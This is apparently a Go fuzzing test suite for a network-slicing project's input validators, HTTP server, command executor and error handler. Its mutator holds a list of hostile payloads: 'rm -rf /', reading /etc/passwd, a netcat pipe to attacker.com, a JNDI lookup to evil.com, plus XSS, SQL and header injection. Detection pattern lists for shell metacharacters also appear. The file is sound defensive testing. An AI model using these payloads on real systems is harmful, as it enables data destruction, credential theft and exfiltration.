// Copyright 2024 O-RAN Intent MANO Project
// SPDX-License-Identifier: Apache-2.0

package security

import (
	"context"
	"encoding/hex"
	"fmt"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"

	"github.com/thc1006/O-RAN-Intent-MANO-for-Network-Slicing/pkg/security"
)

// FuzzingSecuritySuite provides comprehensive fuzzing tests for security components
type FuzzingSecuritySuite struct {
	executor     *security.SecureSubprocessExecutor
	validator    *security.InputValidator
	logger       *TestSecureLogger
	errorHandler *SecureErrorHandler
	httpServer   *SecureHTTPServer
	rng          *FuzzingRNG
}

// FuzzingRNG provides deterministic random number generation for reproducible fuzzing
type FuzzingRNG struct {
	seed uint64
}

func NewFuzzingRNG(seed uint64) *FuzzingRNG {
	return &FuzzingRNG{seed: seed}
}

func (r *FuzzingRNG) Next() uint64 {
	// Linear Congruential Generator for deterministic randomness
	r.seed = (r.seed*1103515245 + 12345) & 0x7fffffff
	return r.seed
}

func (r *FuzzingRNG) IntRange(min, max int) int {
	if min >= max {
		return min
	}
	range_ := max - min
	return min + int(r.Next()%uint64(range_))
}

func (r *FuzzingRNG) Bool() bool {
	return r.Next()%2 == 0
}

func (r *FuzzingRNG) Choice(items []string) string {
	if len(items) == 0 {
		return ""
	}
	return items[r.Next()%uint64(len(items))]
}

func NewFuzzingSecuritySuite(seed uint64) *FuzzingSecuritySuite {
	logger := NewTestSecureLogger()
	return &FuzzingSecuritySuite{
		executor:     security.NewSecureSubprocessExecutor(),
		validator:    security.NewInputValidator(),
		logger:       logger,
		errorHandler: NewSecureErrorHandler(logger),
		httpServer:   NewSecureHTTPServer(DefaultSecurityConfig()),
		rng:          NewFuzzingRNG(seed),
	}
}

// FuzzingMutator provides various mutation strategies for input fuzzing
type FuzzingMutator struct {
	rng *FuzzingRNG
}

func NewFuzzingMutator(rng *FuzzingRNG) *FuzzingMutator {
	return &FuzzingMutator{rng: rng}
}

func (m *FuzzingMutator) MutateString(input string) string {
	if len(input) == 0 {
		return m.generateRandomString(10)
	}

	operations := []func(string) string{
		m.insertRandomChar,
		m.deleteRandomChar,
		m.replaceRandomChar,
		m.duplicateSubstring,
		m.reverseSubstring,
		m.insertMaliciousPayload,
		m.encodeString,
		m.insertUnicodeChars,
		m.insertControlChars,
		m.fragmentString,
	}

	operation := operations[m.rng.Next()%uint64(len(operations))]
	return operation(input)
}

func (m *FuzzingMutator) insertRandomChar(input string) string {
	if len(input) == 0 {
		return string(rune(m.rng.IntRange(32, 127)))
	}

	pos := m.rng.IntRange(0, len(input))
	char := rune(m.rng.IntRange(32, 127))
	return input[:pos] + string(char) + input[pos:]
}

func (m *FuzzingMutator) deleteRandomChar(input string) string {
	if len(input) <= 1 {
		return ""
	}

	pos := m.rng.IntRange(0, len(input))
	return input[:pos] + input[pos+1:]
}

func (m *FuzzingMutator) replaceRandomChar(input string) string {
	if len(input) == 0 {
		return string(rune(m.rng.IntRange(32, 127)))
	}

	pos := m.rng.IntRange(0, len(input))
	char := rune(m.rng.IntRange(32, 127))
	result := []rune(input)
	result[pos] = char
	return string(result)
}

func (m *FuzzingMutator) duplicateSubstring(input string) string {
	if len(input) <= 1 {
		return input + input
	}

	start := m.rng.IntRange(0, len(input))
	end := m.rng.IntRange(start, len(input))
	substring := input[start:end]

	insertPos := m.rng.IntRange(0, len(input))
	return input[:insertPos] + substring + input[insertPos:]
}

func (m *FuzzingMutator) reverseSubstring(input string) string {
	if len(input) <= 1 {
		return input
	}

	start := m.rng.IntRange(0, len(input))
	end := m.rng.IntRange(start, len(input))

	runes := []rune(input)
	for i, j := start, end-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}

	return string(runes)
}

func (m *FuzzingMutator) insertMaliciousPayload(input string) string {
	payloads := []string{
		";rm -rf /",
		"&&cat /etc/passwd",
		"|nc attacker.com 1234",
		"`whoami`",
		"$(id)",
		"../../../etc/passwd",
		"%3B%20rm%20-rf%20%2F",
		"<script>alert('xss')</script>",
		"'; DROP TABLE users; --",
		"\r\nSet-Cookie: malicious=true",
		"\x00../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
	}

	payload := payloads[m.rng.Next()%uint64(len(payloads))]

	if len(input) == 0 {
		return payload
	}

	pos := m.rng.IntRange(0, len(input)+1)
	return input[:pos] + payload + input[pos:]
}

func (m *FuzzingMutator) encodeString(input string) string {
	encodingTypes := []func(string) string{
		m.urlEncode,
		m.hexEncode,
		m.unicodeEncode,
		m.base64Encode,
		m.htmlEncode,
	}

	encoder := encodingTypes[m.rng.Next()%uint64(len(encodingTypes))]
	return encoder(input)
}

func (m *FuzzingMutator) urlEncode(input string) string {
	return url.QueryEscape(input)
}

func (m *FuzzingMutator) hexEncode(input string) string {
	return hex.EncodeToString([]byte(input))
}

func (m *FuzzingMutator) unicodeEncode(input string) string {
	result := ""
	for _, r := range input {
		if r < 128 && m.rng.Bool() {
			result += fmt.Sprintf("\\u%04x", r)
		} else {
			result += string(r)
		}
	}
	return result
}

func (m *FuzzingMutator) base64Encode(input string) string {
	// Simple base64-like encoding for testing
	encoded := ""
	for i, r := range input {
		encoded += fmt.Sprintf("%c", r+rune(i%26))
	}
	return encoded
}

func (m *FuzzingMutator) htmlEncode(input string) string {
	replacer := strings.NewReplacer(
		"&", "&amp;",
		"<", "&lt;",
		">", "&gt;",
		"\"", "&quot;",
		"'", "&#39;",
	)
	return replacer.Replace(input)
}

func (m *FuzzingMutator) insertUnicodeChars(input string) string {
	unicodeRanges := [][2]rune{
		{0x0000, 0x001F}, // Control characters
		{0x007F, 0x009F}, // Additional control characters
		{0x2000, 0x206F}, // General punctuation
		{0xFE00, 0xFE0F}, // Variation selectors
		{0xFFF0, 0xFFFF}, // Specials
	}

	if len(input) == 0 {
		rangeIdx := m.rng.Next() % uint64(len(unicodeRanges))
		selectedRange := unicodeRanges[rangeIdx]
		char := rune(m.rng.IntRange(int(selectedRange[0]), int(selectedRange[1])))
		return string(char)
	}

	pos := m.rng.IntRange(0, len(input)+1)
	rangeIdx := m.rng.Next() % uint64(len(unicodeRanges))
	selectedRange := unicodeRanges[rangeIdx]
	char := rune(m.rng.IntRange(int(selectedRange[0]), int(selectedRange[1])))

	return input[:pos] + string(char) + input[pos:]
}

func (m *FuzzingMutator) insertControlChars(input string) string {
	controlChars := []rune{
		0x00, // NULL
		0x01, // SOH
		0x02, // STX
		0x03, // ETX
		0x04, // EOT
		0x05, // ENQ
		0x06, // ACK
		0x07, // BEL
		0x08, // BS
		0x09, // TAB
		0x0A, // LF
		0x0B, // VT
		0x0C, // FF
		0x0D, // CR
		0x0E, // SO
		0x0F, // SI
		0x1A, // SUB
		0x1B, // ESC
		0x7F, // DEL
	}

	char := controlChars[m.rng.Next()%uint64(len(controlChars))]

	if len(input) == 0 {
		return string(char)
	}

	pos := m.rng.IntRange(0, len(input)+1)
	return input[:pos] + string(char) + input[pos:]
}

func (m *FuzzingMutator) fragmentString(input string) string {
	if len(input) <= 2 {
		return input
	}

	// Split string and insert separators
	separators := []string{" ", "\t", "\n", "\r", "\r\n", "", "||", "&&"}
	separator := separators[m.rng.Next()%uint64(len(separators))]

	mid := len(input) / 2
	return input[:mid] + separator + input[mid:]
}

func (m *FuzzingMutator) generateRandomString(length int) string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
	result := make([]byte, length)

	for i := range result {
		result[i] = chars[m.rng.Next()%uint64(len(chars))]
	}

	return string(result)
}

// TestFuzzingCommandValidation performs fuzzing tests on command validation
func TestFuzzingCommandValidation(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping fuzzing tests in short mode")
	}

	suite := NewFuzzingSecuritySuite(12345) // Fixed seed for reproducibility
	mutator := NewFuzzingMutator(suite.rng)

	// Seed inputs for mutation
	seedInputs := []string{
		"test",
		"ping",
		"127.0.0.1",
		"/tmp/file.txt",
		"eth0",
		"8080",
		"arg1 arg2",
		"--help",
		"-c 1",
		"normal_input",
	}

	t.Run("command_argument_fuzzing", func(t *testing.T) {
		iterations := 10000
		if testing.Short() {
			iterations = 1000
		}

		violations := 0
		crashes := 0
		timeouts := 0

		for i := 0; i < iterations; i++ {
			// Start with a seed input
			seedInput := seedInputs[suite.rng.Next()%uint64(len(seedInputs))]

			// Apply multiple mutations
			fuzzedInput := seedInput
			mutationCount := suite.rng.IntRange(1, 5)

			for j := 0; j < mutationCount; j++ {
				fuzzedInput = mutator.MutateString(fuzzedInput)
			}

			// Test the fuzzed input
			func() {
				defer func() {
					if r := recover(); r != nil {
						crashes++
						t.Logf("Crash detected with input: %q, panic: %v", fuzzedInput, r)
					}
				}()

				start := time.Now()
				err := suite.validator.ValidateCommandArgument(fuzzedInput)
				duration := time.Since(start)

				if duration > 100*time.Millisecond {
					timeouts++
					t.Logf("Timeout detected with input: %q, duration: %v", fuzzedInput, duration)
				}

				if err != nil {
					violations++
				}

				// Additional checks for dangerous patterns that should always be caught
				dangerousPatterns := []string{";", "&", "|", "`", "$", "../", "/etc/passwd", "rm -rf"}
				for _, pattern := range dangerousPatterns {
					if strings.Contains(fuzzedInput, pattern) && err == nil {
						t.Errorf("Dangerous pattern not caught: %q in input %q", pattern, fuzzedInput)
					}
				}
			}()
		}

		t.Logf("Fuzzing results: %d iterations, %d violations, %d crashes, %d timeouts",
			iterations, violations, crashes, timeouts)

		assert.Equal(t, 0, crashes, "No crashes should occur during fuzzing")
		assert.True(t, timeouts < iterations/100, "Timeouts should be rare")
	})

	t.Run("ip_address_fuzzing", func(t *testing.T) {
		iterations := 5000
		ipSeeds := []string{
			"192.168.1.1",
			"127.0.0.1",
			"10.0.0.1",
			"::1",
			"2001:db8::1",
			"fe80::1",
		}

		violations := 0
		crashes := 0

		for i := 0; i < iterations; i++ {
			seedIP := ipSeeds[suite.rng.Next()%uint64(len(ipSeeds))]
			fuzzedIP := mutator.MutateString(seedIP)

			func() {
				defer func() {
					if r := recover(); r != nil {
						crashes++
						t.Logf("IP validation crash with input: %q, panic: %v", fuzzedIP, r)
					}
				}()

				err := suite.validator.ValidateIPAddress(fuzzedIP)
				if err != nil {
					violations++
				}

				// Check for injection patterns
				if strings.ContainsAny(fuzzedIP, ";&|`$") && err == nil {
					t.Errorf("IP injection not caught: %q", fuzzedIP)
				}
			}()
		}

		t.Logf("IP fuzzing results: %d iterations, %d violations, %d crashes",
			iterations, violations, crashes)

		assert.Equal(t, 0, crashes, "No crashes should occur during IP fuzzing")
	})

	t.Run("file_path_fuzzing", func(t *testing.T) {
		iterations := 5000
		pathSeeds := []string{
			"/tmp/file.txt",
			"./local.txt",
			"relative/path.txt",
			"/var/log/app.log",
			"/proc/version",
		}

		violations := 0
		crashes := 0

		for i := 0; i < iterations; i++ {
			seedPath := pathSeeds[suite.rng.Next()%uint64(len(pathSeeds))]
			fuzzedPath := mutator.MutateString(seedPath)

			func() {
				defer func() {
					if r := recover(); r != nil {
						crashes++
						t.Logf("Path validation crash with input: %q, panic: %v", fuzzedPath, r)
					}
				}()

				err := suite.validator.ValidateFilePath(fuzzedPath)
				if err != nil {
					violations++
				}

				// Check for path traversal patterns
				if strings.Contains(fuzzedPath, "../") && err == nil {
					t.Errorf("Path traversal not caught: %q", fuzzedPath)
				}
			}()
		}

		t.Logf("Path fuzzing results: %d iterations, %d violations, %d crashes",
			iterations, violations, crashes)

		assert.Equal(t, 0, crashes, "No crashes should occur during path fuzzing")
	})
}

// TestFuzzingHTTPSecurity performs fuzzing tests on HTTP security components
func TestFuzzingHTTPSecurity(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping HTTP fuzzing tests in short mode")
	}

	suite := NewFuzzingSecuritySuite(54321)
	mutator := NewFuzzingMutator(suite.rng)

	t.Run("http_header_fuzzing", func(t *testing.T) {
		iterations := 2000
		crashes := 0
		securityViolations := 0

		headerNames := []string{
			"Content-Type",
			"Authorization",
			"X-Forwarded-For",
			"User-Agent",
			"Cookie",
			"X-Custom-Header",
		}

		for i := 0; i < iterations; i++ {
			// Fuzz header name
			headerName := headerNames[suite.rng.Next()%uint64(len(headerNames))]
			fuzzedHeaderName := mutator.MutateString(headerName)

			// Fuzz header value
			seedValue := "test_value"
			fuzzedHeaderValue := mutator.MutateString(seedValue)

			func() {
				defer func() {
					if r := recover(); r != nil {
						crashes++
						t.Logf("HTTP header fuzzing crash: header=%q, value=%q, panic=%v",
							fuzzedHeaderName, fuzzedHeaderValue, r)
					}
				}()

				req := httptest.NewRequest("GET", "/health", nil)
				req.Header.Set(fuzzedHeaderName, fuzzedHeaderValue)
				w := httptest.NewRecorder()

				suite.httpServer.router.ServeHTTP(w, req)

				// Check for header injection
				if strings.ContainsAny(fuzzedHeaderValue, "\r\n") {
					securityViolations++
					// Verify injection was prevented
					for name, values := range w.Header() {
						for _, value := range values {
							if strings.Contains(value, "injection") || strings.Contains(name, "Malicious") {
								t.Errorf("Header injection succeeded: %q -> %q", fuzzedHeaderValue, value)
							}
						}
					}
				}
			}()
		}

		t.Logf("HTTP header fuzzing: %d iterations, %d crashes, %d security violations",
			iterations, crashes, securityViolations)

		assert.Equal(t, 0, crashes, "No crashes should occur during HTTP header fuzzing")
	})

	t.Run("http_body_fuzzing", func(t *testing.T) {
		iterations := 1000
		crashes := 0

		bodySeeds := []string{
			`{"config": "test"}`,
			`<xml>test</xml>`,
			`key=value&other=data`,
			`plain text data`,
			`{"array": [1,2,3]}`,
		}

		for i := 0; i < iterations; i++ {
			seedBody := bodySeeds[suite.rng.Next()%uint64(len(bodySeeds))]
			fuzzedBody := seedBody

			// Apply multiple mutations
			mutationCount := suite.rng.IntRange(1, 3)
			for j := 0; j < mutationCount; j++ {
				fuzzedBody = mutator.MutateString(fuzzedBody)
			}

			func() {
				defer func() {
					if r := recover(); r != nil {
						crashes++
						t.Logf("HTTP body fuzzing crash: body=%q, panic=%v", fuzzedBody, r)
					}
				}()

				req := httptest.NewRequest("PUT", "/config", strings.NewReader(fuzzedBody))
				req.Header.Set("Content-Type", "application/json")
				w := httptest.NewRecorder()

				suite.httpServer.router.ServeHTTP(w, req)

				// Should handle malformed input gracefully
				assert.True(t, w.Code >= 200 && w.Code < 600, "Should return valid HTTP status")
			}()
		}

		t.Logf("HTTP body fuzzing: %d iterations, %d crashes", iterations, crashes)
		assert.Equal(t, 0, crashes, "No crashes should occur during HTTP body fuzzing")
	})

	t.Run("url_path_fuzzing", func(t *testing.T) {
		iterations := 1000
		crashes := 0

		pathSeeds := []string{
			"/health",
			"/config",
			"/status",
			"/api/v1/test",
		}

		for i := 0; i < iterations; i++ {
			seedPath := pathSeeds[suite.rng.Next()%uint64(len(pathSeeds))]
			fuzzedPath := mutator.MutateString(seedPath)

			func() {
				defer func() {
					if r := recover(); r != nil {
						crashes++
						t.Logf("URL path fuzzing crash: path=%q, panic=%v", fuzzedPath, r)
					}
				}()

				req := httptest.NewRequest("GET", fuzzedPath, nil)
				w := httptest.NewRecorder()

				suite.httpServer.router.ServeHTTP(w, req)

				// Check for path traversal attempts
				if strings.Contains(fuzzedPath, "../") {
					// Should be handled safely (likely 404 or other error)
					assert.True(t, w.Code >= 400, "Path traversal should be rejected")
				}
			}()
		}

		t.Logf("URL path fuzzing: %d iterations, %d crashes", iterations, crashes)
		assert.Equal(t, 0, crashes, "No crashes should occur during URL path fuzzing")
	})
}

// TestFuzzingCommandExecution performs fuzzing tests on command execution
func TestFuzzingCommandExecution(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping command execution fuzzing tests in short mode")
	}

	suite := NewFuzzingSecuritySuite(98765)
	mutator := NewFuzzingMutator(suite.rng)
	ctx := context.Background()

	t.Run("command_execution_fuzzing", func(t *testing.T) {
		iterations := 1000
		crashes := 0
		timeouts := 0
		securityBlocks := 0

		allowedCommands := []string{"ping", "iperf3", "tc", "ip", "bridge"}
		argSeeds := []string{"-c", "1", "127.0.0.1", "--help", "-h", "show", "dev", "eth0"}

		for i := 0; i < iterations; i++ {
			command := allowedCommands[suite.rng.Next()%uint64(len(allowedCommands))]

			// Generate fuzzed arguments
			argCount := suite.rng.IntRange(1, 5)
			args := make([]string, argCount)

			for j := 0; j < argCount; j++ {
				seedArg := argSeeds[suite.rng.Next()%uint64(len(argSeeds))]
				args[j] = mutator.MutateString(seedArg)
			}

			func() {
				defer func() {
					if r := recover(); r != nil {
						crashes++
						t.Logf("Command execution crash: cmd=%s, args=%v, panic=%v", command, args, r)
					}
				}()

				start := time.Now()
				_, err := suite.executor.SecureExecute(ctx, command, args...)
				duration := time.Since(start)

				if duration > 5*time.Second {
					timeouts++
				}

				if err != nil {
					if strings.Contains(err.Error(), "argument validation failed") ||
						strings.Contains(err.Error(), "command not in allowlist") {
						securityBlocks++
					}
				}
			}()
		}

		t.Logf("Command execution fuzzing: %d iterations, %d crashes, %d timeouts, %d security blocks",
			iterations, crashes, timeouts, securityBlocks)

		assert.Equal(t, 0, crashes, "No crashes should occur during command execution fuzzing")
		assert.True(t, timeouts < iterations/10, "Timeouts should be limited")
	})
}

// TestFuzzingErrorHandling performs fuzzing tests on error handling
func TestFuzzingErrorHandling(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping error handling fuzzing tests in short mode")
	}

	suite := NewFuzzingSecuritySuite(13579)
	mutator := NewFuzzingMutator(suite.rng)

	t.Run("error_message_fuzzing", func(t *testing.T) {
		iterations := 5000
		crashes := 0
		sensitiveLeak := 0

		errorSeeds := []string{
			"authentication failed",
			"database connection error",
			"file not found: /etc/passwd",
			"SQL error in query",
			"network timeout",
			"permission denied",
		}

		for i := 0; i < iterations; i++ {
			seedError := errorSeeds[suite.rng.Next()%uint64(len(errorSeeds))]
			fuzzedError := mutator.MutateString(seedError)

			context := map[string]interface{}{
				"user":   mutator.MutateString("testuser"),
				"action": mutator.MutateString("test_action"),
				"data":   mutator.MutateString("test_data"),
			}

			func() {
				defer func() {
					if r := recover(); r != nil {
						crashes++
						t.Logf("Error handling crash: error=%q, panic=%v", fuzzedError, r)
					}
				}()

				suite.logger.Clear()
				err := fmt.Errorf("%s", fuzzedError)
				handledErr := suite.errorHandler.HandleError(err, context)

				if handledErr != nil {
					// Check for sensitive data leakage
					errorMsg := handledErr.Error()
					sensitivePatterns := []string{
						"password", "secret", "token", "key", "/etc/passwd",
						"admin", "root", "database", "connection string",
					}

					for _, pattern := range sensitivePatterns {
						if strings.Contains(strings.ToLower(errorMsg), pattern) {
							sensitiveLeak++
							t.Logf("Potential sensitive data leak: %q contains %q", errorMsg, pattern)
						}
					}
				}

				// Check logs for sensitive data
				entries := suite.logger.GetEntries()
				for _, entry := range entries {
					if entry.Sensitive {
						t.Logf("Sensitive data detected in logs: %v", entry.Fields)
					}
				}
			}()
		}

		t.Logf("Error handling fuzzing: %d iterations, %d crashes, %d potential leaks",
			iterations, crashes, sensitiveLeak)

		assert.Equal(t, 0, crashes, "No crashes should occur during error handling fuzzing")
		assert.True(t, sensitiveLeak < iterations/100, "Sensitive data leaks should be minimal")
	})
}

// TestFuzzingUnicodeEdgeCases performs specialized fuzzing for Unicode edge cases
func TestFuzzingUnicodeEdgeCases(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping Unicode fuzzing tests in short mode")
	}

	suite := NewFuzzingSecuritySuite(24680)

	t.Run("unicode_normalization_attacks", func(t *testing.T) {
		// Test Unicode normalization vulnerabilities
		unicodeAttacks := []string{
			"test\u0041\u030A",  // A with ring above (Å)
			"test\u00C5",        // Precomposed Å
			"test\u2044",        // Fraction slash
			"test\uFEFF",        // Zero-width no-break space
			"test\u200B",        // Zero-width space
			"test\u200C",        // Zero-width non-joiner
			"test\u200D",        // Zero-width joiner
			"admin\u0041\u030A", // Unicode spoofing attempt
		}

		for _, attack := range unicodeAttacks {
			err := suite.validator.ValidateCommandArgument(attack)

			// Should handle Unicode properly
			if err == nil {
				// If accepted, should be safe
				assert.False(t, strings.Contains(attack, "admin"),
					"Unicode spoofing should be detected: %q", attack)
			}
		}
	})

	t.Run("control_character_injection", func(t *testing.T) {
		controlChars := []rune{
			0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
			0x08, 0x0B, 0x0C, 0x0E, 0x0F, 0x10, 0x11, 0x12,
			0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A,
			0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x7F,
		}

		for _, char := range controlChars {
			testInput := "test" + string(char) + "malicious"

			err := suite.validator.ValidateCommandArgument(testInput)

			// Control characters should generally be rejected or handled safely
			if err == nil {
				t.Logf("Control character accepted: U+%04X in %q", char, testInput)
			}
		}
	})

	t.Run("bidirectional_text_attacks", func(t *testing.T) {
		// Test bidirectional text override attacks
		bidiAttacks := []string{
			"test\u202E" + "gnirts" + "\u202D", // Right-to-left override
			"test\u061C" + "attack",            // Arabic letter mark
			"admin\u200F" + "user",             // Right-to-left mark
			"test\u200E" + "evil",              // Left-to-right mark
		}

		for _, attack := range bidiAttacks {
			err := suite.validator.ValidateCommandArgument(attack)

			if err == nil {
				t.Logf("Bidirectional attack potentially successful: %q", attack)
			}
		}
	})
}

// TestFuzzingRegexComplexity tests for ReDoS (Regular Expression Denial of Service)
func TestFuzzingRegexComplexity(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping regex complexity fuzzing tests in short mode")
	}

	suite := NewFuzzingSecuritySuite(11111)

	t.Run("regex_dos_protection", func(t *testing.T) {
		// Test patterns that could cause catastrophic backtracking
		redosPatterns := []string{
			strings.Repeat("a", 1000) + "X",
			strings.Repeat("(a*)*", 10) + "X",
			strings.Repeat("a+", 20) + "X",
			strings.Repeat("(a|a)*", 5) + "X",
			strings.Repeat("(a?){20}", 1) + strings.Repeat("a", 20),
		}

		for _, pattern := range redosPatterns {
			start := time.Now()

			err := suite.validator.ValidateCommandArgument(pattern)

			duration := time.Since(start)

			// Should not take excessive time
			assert.True(t, duration < 100*time.Millisecond,
				"Regex should not cause DoS: pattern=%q, duration=%v", pattern, duration)

			// Most of these should be rejected anyway
			if err == nil {
				t.Logf("Potentially dangerous pattern accepted: %q", pattern)
			}
		}
	})

	t.Run("nested_quantifier_attacks", func(t *testing.T) {
		// Test nested quantifiers that could cause exponential time complexity
		attacks := []string{
			strings.Repeat("(a*)", 50) + "X",
			strings.Repeat("(a+)*", 20) + "X",
			strings.Repeat("(a?)+", 30) + "X",
		}

		for _, attack := range attacks {
			start := time.Now()

			// Test with different validators that might use regex
			suite.validator.ValidateCommandArgument(attack)
			suite.validator.ValidateFilePath(attack)
			suite.validator.ValidateNetworkInterface(attack)

			totalDuration := time.Since(start)

			assert.True(t, totalDuration < 200*time.Millisecond,
				"Validation should be efficient: attack=%q, duration=%v", attack, totalDuration)
		}
	})
}

// TestFuzzingMemoryExhaustion tests for memory exhaustion attacks
func TestFuzzingMemoryExhaustion(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping memory exhaustion fuzzing tests in short mode")
	}

	suite := NewFuzzingSecuritySuite(55555)

	t.Run("large_input_handling", func(t *testing.T) {
		sizes := []int{1024, 10240, 102400, 1048576} // 1KB to 1MB

		for _, size := range sizes {
			largeInput := strings.Repeat("A", size)

			start := time.Now()
			err := suite.validator.ValidateCommandArgument(largeInput)
			duration := time.Since(start)

			// Should reject large inputs quickly
			assert.Error(t, err, "Large input should be rejected: size=%d", size)
			assert.True(t, duration < 100*time.Millisecond,
				"Large input should be rejected quickly: size=%d, duration=%v", size, duration)
		}
	})

	t.Run("recursive_structure_attacks", func(t *testing.T) {
		// Test deeply nested structures that could exhaust memory
		depth := 1000
		nestedInput := strings.Repeat("(", depth) + "test" + strings.Repeat(")", depth)

		err := suite.validator.ValidateCommandArgument(nestedInput)
		assert.Error(t, err, "Deeply nested input should be rejected")
	})

	t.Run("repeated_pattern_attacks", func(t *testing.T) {
		// Test patterns with many repetitions
		patterns := []string{
			strings.Repeat("test;", 10000),
			strings.Repeat("../", 10000),
			strings.Repeat("&&", 10000),
			strings.Repeat("||", 10000),
		}

		for _, pattern := range patterns {
			start := time.Now()
			err := suite.validator.ValidateCommandArgument(pattern)
			duration := time.Since(start)

			assert.Error(t, err, "Repeated pattern should be rejected: %s...", pattern[:20])
			assert.True(t, duration < 50*time.Millisecond,
				"Repeated pattern should be rejected quickly: duration=%v", duration)
		}
	})
}

// TestPropertyBasedFuzzing implements property-based testing for security invariants
func TestPropertyBasedFuzzing(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping property-based fuzzing tests in short mode")
	}

	suite := NewFuzzingSecuritySuite(77777)
	mutator := NewFuzzingMutator(suite.rng)

	t.Run("security_invariants", func(t *testing.T) {
		iterations := 10000

		for i := 0; i < iterations; i++ {
			// Generate random input
			input := mutator.generateRandomString(suite.rng.IntRange(1, 100))

			// Apply random mutations
			mutationCount := suite.rng.IntRange(1, 5)
			for j := 0; j < mutationCount; j++ {
				input = mutator.MutateString(input)
			}

			// Test security invariants
			testSecurityInvariants(t, suite, input)
		}
	})
}

func testSecurityInvariants(t *testing.T, suite *FuzzingSecuritySuite, input string) {
	// Invariant 1: Dangerous characters should always be rejected
	dangerousChars := []string{";", "&", "|", "`", "$", "../", "/etc/passwd", "rm -rf"}
	hasDangerous := false
	for _, char := range dangerousChars {
		if strings.Contains(input, char) {
			hasDangerous = true
			break
		}
	}

	err := suite.validator.ValidateCommandArgument(input)
	if hasDangerous && err == nil {
		t.Errorf("Dangerous input not rejected: %q", input)
	}

	// Invariant 2: Validation should be deterministic
	err1 := suite.validator.ValidateCommandArgument(input)
	err2 := suite.validator.ValidateCommandArgument(input)

	if (err1 == nil) != (err2 == nil) {
		t.Errorf("Validation not deterministic for input: %q", input)
	}

	// Invariant 3: Validation should complete in reasonable time
	start := time.Now()
	suite.validator.ValidateCommandArgument(input)
	duration := time.Since(start)

	if duration > 10*time.Millisecond {
		t.Errorf("Validation too slow for input: %q, duration: %v", input, duration)
	}

	// Invariant 4: No panics should occur
	func() {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic during validation of input: %q, panic: %v", input, r)
			}
		}()

		suite.validator.ValidateCommandArgument(input)
		suite.validator.ValidateIPAddress(input)
		suite.validator.ValidateFilePath(input)
		suite.validator.ValidateNetworkInterface(input)
	}()
}

// BenchmarkFuzzingPerformance benchmarks the performance of fuzzing operations
func BenchmarkFuzzingPerformance(b *testing.B) {
	suite := NewFuzzingSecuritySuite(99999)
	mutator := NewFuzzingMutator(suite.rng)

	b.Run("mutation_performance", func(b *testing.B) {
		input := "test_input_for_mutation"
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			mutator.MutateString(input)
		}
	})

	b.Run("validation_under_fuzzing", func(b *testing.B) {
		inputs := make([]string, 1000)
		for i := range inputs {
			inputs[i] = mutator.generateRandomString(20)
		}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			input := inputs[i%len(inputs)]
			suite.validator.ValidateCommandArgument(input)
		}
	})

	b.Run("complex_mutation_chain", func(b *testing.B) {
		seedInput := "legitimate_input"
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			result := seedInput
			for j := 0; j < 5; j++ {
				result = mutator.MutateString(result)
			}
			_ = result
		}
	})
}
